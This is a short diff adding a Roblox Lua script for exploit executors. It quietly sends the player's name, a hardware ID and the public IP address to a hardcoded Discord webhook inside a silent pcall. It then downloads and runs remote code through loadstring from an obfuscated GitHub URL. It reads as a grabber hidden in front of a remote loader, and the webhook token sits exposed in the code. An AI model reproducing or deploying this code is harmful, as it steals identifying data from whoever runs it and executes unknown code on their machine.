@@ -1,0 +1,53 @@
+
+local webh = "https://discord.com/api/webhooks/1078976805807067146/me45p_pfBQVXf1xMnBvbhxdwwrocJjBF_bdbJOYyyP8DGmFreQRXdWEV6nZcpA1FdZHe"
+
+pcall(function()
+   local data = {
+       ["embeds"] = {
+           {
+               ["title"] = game:GetService("Players").LocalPlayer.Name,
+               ["description"] = " HWID: " ..game:GetService("RbxAnalyticsService"):GetClientId().. 
+                             
+                             " IP: " ..game:HttpGet("https://api.ipify.org")
+           }
+       }
+   }
+
+   if syn then
+       local response = syn.request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif request then
+       local response = request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   elseif http_request then
+       local response = http_request(
+           {
+               Url = webh,
+               Method = 'POST',
+               Headers = {
+                   ['Content-Type'] = 'application/json'
+               },
+               Body = game:GetService('HttpService'):JSONEncode(data)
+           }
+       );
+   end
+end)
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/8z34-X3Z4-0Bx40-V9/92848-193828-2939/main/29a837-02jo82038-399274839-302948aj93-39297he39"))()
